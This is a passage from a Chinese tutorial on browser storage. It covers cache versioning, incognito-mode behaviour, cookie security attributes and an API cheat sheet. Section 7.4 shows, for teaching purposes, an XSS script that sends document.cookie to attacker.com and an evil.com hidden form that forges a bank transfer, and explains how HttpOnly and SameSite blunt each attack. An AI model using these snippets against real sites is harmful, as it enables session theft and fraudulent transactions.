    - 不要假设“本地数据永远在”，重要数据要能**从服务端重新拉取**；
    - 本地缓存建议有**版本号**：发现版本不一致/解析失败时，主动清空并重新拉取；
    - 对于 IndexedDB，可以在打开数据库失败或读写失败时，有**降级方案**（比如不缓存，只走接口）。

### 7.3 隐私模式（无痕模式）下的行为
不同浏览器实现略有差异，但可以大致记住这些规则（以现代桌面浏览器为主）：

+ **LocalStorage / SessionStorage**
    - 在无痕窗口中仍然可用，但**仅在当前无痕会话中存在**；
    - 关闭所有无痕窗口后，这些数据会被**整体清除**；
    - 普通窗口和无痕窗口之间的数据是互相隔离的。
+ **Cookie**
    - 无痕模式下，Cookie 一般仍然可以使用（包括登录等功能）；
    - 但在关闭所有无痕窗口后，这些 Cookie 会被一起清除，不会保留到普通模式；
    - 某些浏览器在无痕模式下会对第三方 Cookie 更加严格（直接屏蔽）。

> 设计时的思路：**不要在无痕模式下指望“下次还在”**，一切本地存储都应视为“当前会话级”。
>

### 7.4 安全攻击实战：XSS / CSRF 与 Cookie 属性
前面已经从概念上解释了 HttpOnly 和 SameSite，这里用两个极简“攻击对比”让记忆更深一点。

#### 7.4.1 XSS 窃取 Cookie vs HttpOnly 防护
+ **没有 HttpOnly 时的风险示意**

```javascript
// 假设页面存在 XSS 漏洞，攻击者注入了如下脚本：
const img = new Image();
img.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
// 浏览器会请求 attacker.com，把当前域名下所有可见 Cookie 发过去
```

+ **加上 HttpOnly 之后的变化**
    - 登录态 Cookie 设置为：`Set-Cookie: sessionId=xxx; HttpOnly; Secure; ...`
    - 此时 `document.cookie` 中**看不到** `sessionId`，恶意 JS 无法窃取到 sessionId；
    - 浏览器仍会在请求头里自动携带 `Cookie: sessionId=xxx` 给服务器。

> 记住：**HttpOnly 不是防止 XSS 注入，而是让“即使被注入 JS，也偷不到关键 Cookie”。**
>

#### 7.4.2 CSRF 攻击 vs SameSite 策略
假设你登录了 `bank.com`，浏览器里有一个 `sessionId` Cookie。  
攻击者在 `evil.com` 放了一个表单，诱导你点击提交：

```html
<!-- evil.com 页面上 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
  <button type="submit">点我抽奖</button>

</form>

```

+ **没有 SameSite 时**：
    - 浏览器会自动携带 `bank.com` 的 `sessionId` 到 `/transfer` 请求；
    - 后端如果只看 Cookie 里的 sessionId，就误以为是用户本人发起的转账请求。
+ **配置 **`SameSite=Lax/Strict`** 之后**（简化理解）：

| SameSite 值 | 跨站普通 POST 是否带 Cookie？ | 典型效果 |
| --- | --- | --- |
| Strict | 基本不带 | 最安全，但体验差 |
| Lax（默认） | 通常不带，部分 GET 导航会带 | 日常推荐 |
| None + Secure | 会带，但必须 HTTPS | 第三方场景（嵌入式） |


> 记忆重点：**CSRF 利用的是“浏览器自动带 Cookie”这一点；SameSite 是让浏览器在“跨站请求”时“少带或不带 Cookie”。**
>

---

## 八、附录：快速参考
### API 速查表
| 操作 | LocalStorage | SessionStorage | Cookie |
| --- | --- | --- | --- |
| 设置 | `localStorage.setItem(key, value)` | `sessionStorage.setItem(key, value)` | `document.cookie = "key=value; ..."` |
| 读取 | `localStorage.getItem(key)` | `sessionStorage.getItem(key)` | `document.cookie`（需解析） |
| 删除 | `localStorage.removeItem(key)` | `sessionStorage.removeItem(key)` | `document.cookie = "key=; max-age=0"` |
| 清空 | `localStorage.clear()` | `sessionStorage.clear()` | 需逐个删除 |
| 遍历 | `localStorage.key(index)` | `sessionStorage.key(index)` | `document.cookie.split('; ')` |


### 存储对象/数组通用方法
```javascript
// 存储
const data = { name: '张三', age: 20 };
localStorage.setItem('user', JSON.stringify(data));

// 读取
const user = JSON.parse(localStorage.getItem('user'));

// 安全读取（带错误处理）
function safeGet(key) {
  try {
    const value = localStorage.getItem(key);
    return value ? JSON.parse(value) : null;
  } catch (e) {
    console.error('解析失败：', e);
    localStorage.removeItem(key);
    return null;
  }
}
```

---

**记住这几个关键点，你就能正确、安全地使用浏览器三大存储，避开新手99%的坑！**
